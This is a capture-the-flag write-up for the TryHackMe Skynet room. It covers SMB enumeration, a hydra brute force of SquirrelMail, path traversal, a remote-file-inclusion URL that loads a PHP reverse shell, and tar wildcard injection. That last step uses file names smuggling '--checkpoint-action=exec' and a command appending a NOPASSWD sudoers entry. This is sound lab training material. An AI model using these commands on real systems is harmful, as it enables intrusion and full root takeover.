# CTF_skynet
this is Poc writeup CTF skynet from TryHackMe.com, link https://tryhackme.com/room/skynet

## tools
1. nmap (looking port that open)
2. dirb (brute listing directory)
3. smbmap (mapping smb server)
4. smbclient (log in smb server)
5. burp (community edition)
6. nc or Ncat (listener reverse shell)
7. python3 (for http.server)
8. nano (text editor)
9. hydra (brute force by wordlist from login form)
10. gobuster (brute listing director)
11. searchsploit (search exploit that match with targeted system)

## Let's Rock n Roll
1. scanning port that opened using nmap :

![nmap](/submit/1.png "nmap")

2. brute listing directory using dirb :

![dirb](/submit/2.png "dirb")

3. while waiting dirb processing, let's try mapping the smbserver using smb map, here's the result :

![smbmap](/submit/4.png "smbmap")

4. the anonymous client is still on, now let's try login using anonymous user using smbclient:

![smbclient](/submit/5.png "smbclient")

5. after dirb finished, we got interesting directory. there is /squirrelmail. open browser that access hhtp://**your machine**/squirrelmail :
  
![webview](/submit/6.png "webview")
  
6. back to the smbclient, then check the directory using ls command. after that we've got attention.txt and file log1.txt,log2.txt,log3.txt on directory logs. download all the files using get command :
  
![smbclient](/submit/7.png "smbclient")

7. check all of files using cat. information that we've got, there is maintenance service so all credential will be reseted. from attention.txt there is username information taht we can use for brute force. information that we got from log2.txt is all password for first login before update password :
  
![smbclient](/submit/8.png "smbclient")
  
8. use burp to intercept and get url GET information that we can combined using Hydra for brute force. fill the form username and password than push button login. than we got the GET url :
  
![burp](/submit/10.png "burp")
  
![burp](/submit/12.png "burp")

![burp](/submit/13.png "burp")
  
9. information that we got is, GET method, url http://**your machine**/squirrelmail/src/redirect.php, and the respon output that we can use as parameter that login was failed. then use hydra with username milesdyson and password wordlist (**log2.txt**), like the command bellow :

![hydra](/submit/14.png "hydra")
  
10. after we got information username and password, login into the squirrelmail and access the email from synet@skynet with subject Samba Password Reset. use the password credential for login as milesdyson with smbclient :
 
![webview](/submit/15.png "webview")
 
![webview](/submit/16.png "webview")
  
![sambaclient](/submit/17.png "sambaclient")
  
11. list the item on the directory. there is **notes** directory, access it. than download the important.txt using get command :

![sambaclient](/submit/19.png "sambaclient")
   
12. now, we got information that machine use CMS. the CMS was in directory at the image bellow. just put the directory affter your machine target ip like this http://**machine target**/**the directory** using browser :

![cat](/submit/21.png "cat")

![webview](/submit/22.png "webview")

13. use gobuster for brute the directory. in this case i'm using dirb wordlist and got the CMS pannel on http://**your target**/**the directory**/Administrator/ :

![gobuster](/submit/23.png "gobuster")

![webview](/submit/24.png "webview")

14. then use searchsploit to get the information. there is Local/Remote vuln on file alertConfigField.php. in this case, just add ../../../../../../etc/passwd on url browser and the /etc/passwd information show off :

![searchsploit](/submit/25.png "searchsploit")

![cat](/submit/26.png "cat")

![webview](/submit/27.png "webview")

15. creat reverse shell in PHP than run the simple http server using python3 for upload the PHP reverse shell script to the target machine afterthat use ncat for listener. then open the browser and type http://**your target**/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://**local machine**/reverse.php, now we got the shell :

![nano](/submit/28.png "nano")

![ncat](/submit/29.png "ncat")

![reverseShell](/submit/30.png "reverseShell")

![reverseShell](/submit/31.png "reverseShell")

16. go into desktop directory milesdyson and there is user.txt, use cat for show the output :

![reverseShell](/submit/32.png "reverseShell")

17. check crontab file to get information, which service runing by **root**. there's backup.sh that will be run on /var/www/html/ approximately every one minutes. copy backup.sh into /var/www/html then run the several comment bellow :
- **echo 'echo "www-data ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > sudo.sh**
- **touch "/var/www/html/--checkpoint-action=exec=sh sudo.sh"**
- **touch "/var/www/html/--checkpoint=1"**

![reverseShell](/submit/36.png "reverseShell")

![previlegeescall](/submit/37.png "previlegeescall")

![previlegeescall](/submit/38.png "previlegeescall")

18. BOOM we got the root access. now go into **/root** and cat the root.txt

![previlegeescall](/submit/39.png "previlegeescall")

73 good luck
